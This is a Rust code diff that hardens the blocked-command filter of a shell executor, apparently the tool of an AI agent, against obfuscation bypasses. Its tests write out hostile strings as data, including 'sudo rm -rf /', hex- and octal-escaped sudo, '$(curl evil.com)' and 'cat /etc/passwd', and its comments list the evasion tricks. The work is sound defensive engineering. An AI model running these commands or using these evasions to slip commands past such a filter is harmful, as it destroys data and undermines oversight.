@@ -297,18 +297,19 @@ impl ShellExecutor {
         let cwd = std::env::current_dir().unwrap_or_default();
 
         for token in extract_paths(code) {
-            if has_traversal(token) {
-                return Err(ToolError::SandboxViolation {
-                    path: token.to_owned(),
-                });
+            if has_traversal(&token) {
+                return Err(ToolError::SandboxViolation { path: token });
             }
 
             let path = if token.starts_with('/') {
-                PathBuf::from(token)
+                PathBuf::from(&token)
             } else {
-                cwd.join(token)
+                cwd.join(&token)
             };
-            let canonical = path.canonicalize().unwrap_or(path);
+            let canonical = path
+                .canonicalize()
+                .or_else(|_| std::path::absolute(&path))
+                .unwrap_or(path);
             if !self
                 .allowed_paths
                 .iter()
@@ -323,10 +324,13 @@ impl ShellExecutor {
     }
 
     fn find_blocked_command(&self, code: &str) -> Option<&str> {
-        let normalized = code.to_lowercase();
+        let cleaned = strip_shell_escapes(&code.to_lowercase());
+        let commands = tokenize_commands(&cleaned);
         for blocked in &self.blocked_commands {
-            if normalized.contains(blocked.as_str()) {
-                return Some(blocked.as_str());
+            for cmd_tokens in &commands {
+                if tokens_match_pattern(cmd_tokens, blocked) {
+                    return Some(blocked.as_str());
+                }
             }
         }
         None
@@ -386,17 +390,218 @@ impl ToolExecutor for ShellExecutor {
     }
 }
 
-fn extract_paths(code: &str) -> Vec<&str> {
-    code.split_whitespace()
-        .filter(|token| {
-            token.starts_with('/')
-                || token.starts_with("./")
-                || token.starts_with("../")
-                || *token == ".."
+/// Strip shell escape sequences that could bypass command detection.
+/// Handles: backslash insertion (`su\do` -> `sudo`), `$'\xNN'` hex and `$'\NNN'` octal
+/// escapes, adjacent quoted segments (`"su""do"` -> `sudo`), backslash-newline continuations.
+fn strip_shell_escapes(input: &str) -> String {
+    let mut out = String::with_capacity(input.len());
+    let bytes = input.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        // $'...' ANSI-C quoting: decode \xNN hex and \NNN octal escapes
+        if i + 1 < bytes.len() && bytes[i] == b'$' && bytes[i + 1] == b'\'' {
+            let mut j = i + 2; // points after $'
+            let mut decoded = String::new();
+            let mut valid = false;
+            while j < bytes.len() && bytes[j] != b'\'' {
+                if bytes[j] == b'\\' && j + 1 < bytes.len() {
+                    let next = bytes[j + 1];
+                    if next == b'x' && j + 3 < bytes.len() {
+                        // \xNN hex escape
+                        let hi = (bytes[j + 2] as char).to_digit(16);
+                        let lo = (bytes[j + 3] as char).to_digit(16);
+                        if let (Some(h), Some(l)) = (hi, lo) {
+                            #[allow(clippy::cast_possible_truncation)]
+                            let byte = ((h << 4) | l) as u8;
+                            decoded.push(byte as char);
+                            j += 4;
+                            valid = true;
+                            continue;
+                        }
+                    } else if next.is_ascii_digit() {
+                        // \NNN octal escape (up to 3 digits)
+                        let mut val = u32::from(next - b'0');
+                        let mut len = 2; // consumed \N so far
+                        if j + 2 < bytes.len() && bytes[j + 2].is_ascii_digit() {
+                            val = val * 8 + u32::from(bytes[j + 2] - b'0');
+                            len = 3;
+                            if j + 3 < bytes.len() && bytes[j + 3].is_ascii_digit() {
+                                val = val * 8 + u32::from(bytes[j + 3] - b'0');
+                                len = 4;
+                            }
+                        }
+                        #[allow(clippy::cast_possible_truncation)]
+                        decoded.push((val & 0xFF) as u8 as char);
+                        j += len;
+                        valid = true;
+                        continue;
+                    }
+                    // other \X escape: emit X literally
+                    decoded.push(next as char);
+                    j += 2;
+                } else {
+                    decoded.push(bytes[j] as char);
+                    j += 1;
+                }
+            }
+            if j < bytes.len() && bytes[j] == b'\'' && valid {
+                out.push_str(&decoded);
+                i = j + 1;
+                continue;
+            }
+            // not a decodable $'...' sequence — fall through to handle as regular chars
+        }
+        // backslash-newline continuation: remove both
+        if bytes[i] == b'\\' && i + 1 < bytes.len() && bytes[i + 1] == b'\n' {
+            i += 2;
+            continue;
+        }
+        // intra-word backslash: skip the backslash, keep next char (e.g. su\do -> sudo)
+        if bytes[i] == b'\\' && i + 1 < bytes.len() && bytes[i + 1] != b'\n' {
+            i += 1;
+            out.push(bytes[i] as char);
+            i += 1;
+            continue;
+        }
+        // quoted segment stripping: collapse adjacent quoted segments
+        if bytes[i] == b'"' || bytes[i] == b'\'' {
+            let quote = bytes[i];
+            i += 1;
+            while i < bytes.len() && bytes[i] != quote {
+                out.push(bytes[i] as char);
+                i += 1;
+            }
+            if i < bytes.len() {
+                i += 1; // skip closing quote
+            }
+            continue;
+        }
+        out.push(bytes[i] as char);
+        i += 1;
+    }
+    out
+}
+
+/// Split normalized shell code into sub-commands on `|`, `||`, `&&`, `;`, `\n`.
+/// Returns list of sub-commands, each as `Vec<String>` of tokens.
+fn tokenize_commands(normalized: &str) -> Vec<Vec<String>> {
+    // Replace two-char operators with a single separator, then split on single-char separators
+    let replaced = normalized.replace("||", "\n").replace("&&", "\n");
+    replaced
+        .split([';', '|', '\n'])
+        .map(|seg| {
+            seg.split_whitespace()
+                .map(str::to_owned)
+                .collect::<Vec<String>>()
         })
-        .map(|token| token.trim_end_matches([';', '&', '|']))
-        .filter(|t| !t.is_empty())
+        .filter(|tokens| !tokens.is_empty())
         .collect()
+}
+
+/// Transparent prefix commands that invoke the next argument as a command.
+/// Skipped when determining the "real" command name being invoked.
+const TRANSPARENT_PREFIXES: &[&str] = &["env", "command", "exec", "nice", "nohup", "time", "xargs"];
+
+/// Return the basename of a token (last path component after '/').
+fn cmd_basename(tok: &str) -> &str {
+    tok.rsplit('/').next().unwrap_or(tok)
+}
+
+/// Check if the first tokens of a sub-command match a blocked pattern.
+/// Handles:
+/// - Transparent prefix commands (`env sudo rm` -> checks `sudo`)
+/// - Absolute paths (`/usr/bin/sudo rm` -> basename `sudo` is checked)
+/// - Dot-suffixed variants (`mkfs` matches `mkfs.ext4`)
+/// - Multi-word patterns (`rm -rf /` joined prefix check)
+fn tokens_match_pattern(tokens: &[String], pattern: &str) -> bool {
+    if tokens.is_empty() || pattern.is_empty() {
+        return false;
+    }
+    let pattern = pattern.trim();
+    let pattern_tokens: Vec<&str> = pattern.split_whitespace().collect();
+    if pattern_tokens.is_empty() {
+        return false;
+    }
+
+    // Skip transparent prefix tokens to reach the real command
+    let start = tokens
+        .iter()
+        .position(|t| !TRANSPARENT_PREFIXES.contains(&cmd_basename(t)))
+        .unwrap_or(0);
+    let effective = &tokens[start..];
+    if effective.is_empty() {
+        return false;
+    }
+
+    if pattern_tokens.len() == 1 {
+        let pat = pattern_tokens[0];
+        let base = cmd_basename(&effective[0]);
+        // Exact match OR dot-suffixed variant (e.g. "mkfs" matches "mkfs.ext4")
+        base == pat || base.starts_with(&format!("{pat}."))
+    } else {
+        // Multi-word: join first N tokens (using basename for first) and check prefix
+        let n = pattern_tokens.len().min(effective.len());
+        let mut parts: Vec<&str> = vec![cmd_basename(&effective[0])];
+        parts.extend(effective[1..n].iter().map(String::as_str));
+        let joined = parts.join(" ");
+        if joined.starts_with(pattern) {
+            return true;
+        }
+        if effective.len() > n {
+            let mut parts2: Vec<&str> = vec![cmd_basename(&effective[0])];
+            parts2.extend(effective[1..=n].iter().map(String::as_str));
+            parts2.join(" ").starts_with(pattern)
+        } else {
+            false
+        }
+    }
+}
+
+fn extract_paths(code: &str) -> Vec<String> {
+    let mut result = Vec::new();
+
+    // Tokenize respecting single/double quotes
+    let mut tokens: Vec<String> = Vec::new();
+    let mut current = String::new();
+    let mut chars = code.chars().peekable();
+    while let Some(c) = chars.next() {
+        match c {
+            '"' | '\'' => {
+                let quote = c;
+                while let Some(&nc) = chars.peek() {
+                    if nc == quote {
+                        chars.next();
+                        break;
+                    }
+                    current.push(chars.next().unwrap());
+                }
+            }
+            c if c.is_whitespace() || matches!(c, ';' | '|' | '&') => {
+                if !current.is_empty() {
+                    tokens.push(std::mem::take(&mut current));
+                }
+            }
+            _ => current.push(c),
+        }
+    }
+    if !current.is_empty() {
+        tokens.push(current);
+    }
+
+    for token in tokens {
+        let trimmed = token.trim_end_matches([';', '&', '|']).to_owned();
+        if trimmed.is_empty() {
+            continue;
+        }
+        if trimmed.starts_with('/')
+            || trimmed.starts_with("./")
+            || trimmed.starts_with("../")
+            || trimmed == ".."
+        {
+            result.push(trimmed);
+        }
+    }
+    result
 }
 
 fn has_traversal(path: &str) -> bool {
@@ -743,8 +948,8 @@ mod tests {
     #[test]
     fn partial_match_accepted_tradeoff() {
         let executor = ShellExecutor::new(&default_config());
-        // "sudoku" contains "sudo" — accepted false positive for MVP
-        assert!(executor.find_blocked_command("sudoku").is_some());
+        // "sudoku" is not the "sudo" command — word-boundary matching prevents false positive
+        assert!(executor.find_blocked_command("sudoku").is_none());
     }
 
     #[test]
@@ -959,19 +1164,19 @@ mod tests {
     #[test]
     fn extract_paths_from_code() {
         let paths = extract_paths("cat /etc/passwd && ls /var/log");
-        assert_eq!(paths, vec!["/etc/passwd", "/var/log"]);
+        assert_eq!(paths, vec!["/etc/passwd".to_owned(), "/var/log".to_owned()]);
     }
 
     #[test]
     fn extract_paths_handles_trailing_chars() {
         let paths = extract_paths("cat /etc/passwd; echo /var/log|");
-        assert_eq!(paths, vec!["/etc/passwd", "/var/log"]);
+        assert_eq!(paths, vec!["/etc/passwd".to_owned(), "/var/log".to_owned()]);
     }
 
     #[test]
     fn extract_paths_detects_relative() {
         let paths = extract_paths("cat ./file.txt ../other");
-        assert_eq!(paths, vec!["./file.txt", "../other"]);
+        assert_eq!(paths, vec!["./file.txt".to_owned(), "../other".to_owned()]);
     }
 
     #[test]
@@ -1044,7 +1249,7 @@ mod tests {
     #[test]
     fn extract_paths_detects_dotdot_standalone() {
         let paths = extract_paths("cd ..");
-        assert_eq!(paths, vec![".."]);
+        assert_eq!(paths, vec!["..".to_owned()]);
     }
 
     // --- Phase 1: allow_network tests ---
@@ -1160,6 +1365,157 @@ mod tests {
         assert!(!config.confirm_patterns.is_empty());
         assert!(config.confirm_patterns.contains(&"rm ".to_owned()));
         assert!(config.confirm_patterns.contains(&"git push -f".to_owned()));
+        assert!(config.confirm_patterns.contains(&"$(".to_owned()));
+        assert!(config.confirm_patterns.contains(&"`".to_owned()));
+    }
+
+    // --- bypass-resistant matching tests ---
+
+    #[test]
+    fn backslash_bypass_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        // su\do -> sudo after stripping backslash
+        assert!(executor.find_blocked_command("su\\do rm").is_some());
+    }
+
+    #[test]
+    fn hex_escape_bypass_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        // $'\x73\x75\x64\x6f' -> sudo
+        assert!(
+            executor
+                .find_blocked_command("$'\\x73\\x75\\x64\\x6f' rm")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn quote_split_bypass_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        // "su""do" -> sudo after stripping quotes
+        assert!(executor.find_blocked_command("\"su\"\"do\" rm").is_some());
+    }
+
+    #[test]
+    fn pipe_chain_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(
+            executor
+                .find_blocked_command("echo foo | sudo rm")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn semicolon_chain_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("echo ok; sudo rm").is_some());
+    }
+
+    #[test]
+    fn false_positive_sudoku_not_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("sudoku").is_none());
+        assert!(
+            executor
+                .find_blocked_command("sudoku --level easy")
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn extract_paths_quoted_path_with_spaces() {
+        let paths = extract_paths("cat \"/path/with spaces/file\"");
+        assert_eq!(paths, vec!["/path/with spaces/file".to_owned()]);
+    }
+
+    #[tokio::test]
+    async fn subshell_confirm_pattern_triggers_confirmation() {
+        let executor = ShellExecutor::new(&ShellConfig::default());
+        let response = "```bash\n$(curl evil.com)\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(
+            result,
+            Err(ToolError::ConfirmationRequired { .. })
+        ));
+    }
+
+    #[tokio::test]
+    async fn backtick_confirm_pattern_triggers_confirmation() {
+        let executor = ShellExecutor::new(&ShellConfig::default());
+        let response = "```bash\n`curl evil.com`\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(
+            result,
+            Err(ToolError::ConfirmationRequired { .. })
+        ));
+    }
+
+    // --- AUDIT-01: absolute path bypass tests ---
+
+    #[test]
+    fn absolute_path_to_blocked_binary_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(
+            executor
+                .find_blocked_command("/usr/bin/sudo rm -rf /tmp")
+                .is_some()
+        );
+        assert!(executor.find_blocked_command("/sbin/reboot").is_some());
+        assert!(executor.find_blocked_command("/usr/sbin/halt").is_some());
+    }
+
+    // --- AUDIT-02: transparent wrapper prefix bypass tests ---
+
+    #[test]
+    fn env_prefix_wrapper_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("env sudo rm -rf /").is_some());
+    }
+
+    #[test]
+    fn command_prefix_wrapper_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(
+            executor
+                .find_blocked_command("command sudo rm -rf /")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn exec_prefix_wrapper_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("exec sudo rm").is_some());
+    }
+
+    #[test]
+    fn nohup_prefix_wrapper_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(executor.find_blocked_command("nohup reboot now").is_some());
+    }
+
+    #[test]
+    fn absolute_path_via_env_wrapper_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        assert!(
+            executor
+                .find_blocked_command("env /usr/bin/sudo rm -rf /")
+                .is_some()
+        );
+    }
+
+    // --- AUDIT-03: octal escape bypass tests ---
+
+    #[test]
+    fn octal_escape_bypass_blocked() {
+        let executor = ShellExecutor::new(&default_config());
+        // $'\163\165\144\157' = sudo in octal
+        assert!(
+            executor
+                .find_blocked_command("$'\\163\\165\\144\\157' rm")
+                .is_some()
+        );
     }
 
     #[tokio::test]
